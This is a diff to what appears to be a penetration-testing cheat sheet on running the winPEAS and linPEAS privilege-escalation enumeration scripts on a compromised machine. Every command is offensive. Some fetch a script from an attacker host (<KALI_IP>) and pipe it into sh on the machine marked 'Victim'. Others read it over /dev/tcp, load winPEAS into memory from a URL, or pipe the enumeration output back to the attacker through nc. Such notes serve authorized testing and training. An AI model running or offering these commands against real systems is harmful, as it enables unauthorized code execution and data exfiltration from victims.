@@ -4,17 +4,17 @@
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("<OPTIONAL_PARAM>")
 
 # fileless execution of linpeas
-sudo python3 -m http.server 80
-curl <KALI_IP>/linpeas.sh | sh #Victim
+sudo systemctl start apache2
+curl <KALI_IP>/lin/linpeas.sh | sh #Victim
 
 # fileless execution of linpeas
 sudo nc -q 5 -lvnp 80 < linpeas.sh
 cat < /dev/tcp/<KALI_IP>/80 | sh #Victim
 
 # excute from memory and send output back to the host
-sudo python3 -m http.server 80
+sudo systemctl start apache2
 nc -lvnp 9002 | tee linpeas.out
-curl <KALI_IP>/linpeas.sh | sh | nc <KALI_IP> 9002 #Victim
+curl <KALI_IP>/lin/linpeas.sh | sh | nc <KALI_IP> 9002 #Victim
 
 #read linpeas output with colors
 less -r linpeas.out
